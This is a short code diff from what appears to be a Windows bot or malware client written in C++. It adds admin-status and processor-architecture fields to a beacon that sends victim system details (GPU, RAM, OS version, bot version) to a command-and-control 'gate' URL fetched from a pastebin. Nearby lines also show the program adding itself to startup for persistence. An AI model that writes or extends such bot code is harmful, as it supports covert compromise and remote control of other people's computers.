@@ -56,6 +56,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 			Helpers::addstartup();
 		}
 
+		std::cout << OsHelpers::checkPEIsAdmin();
+		std::cout << OsHelpers::PrcessorArchitecture();
 
 		//Fetch Gate from raw Site
 		http::Request request(config.pastebinUrl);
@@ -85,6 +87,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 					"&gpu=" + OsHelpers::getGpuName() +
 					"&ram=" + OsHelpers::getRam() +
 					"&os=" + Helpers::GetWindowsVersionString() +
+					"&aornot=" + OsHelpers::checkPEIsAdmin() +
+					"&arch=" + OsHelpers::PrcessorArchitecture() +
 					"&botversion=" + encryptDecrypt("2.0"),
 					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 				);
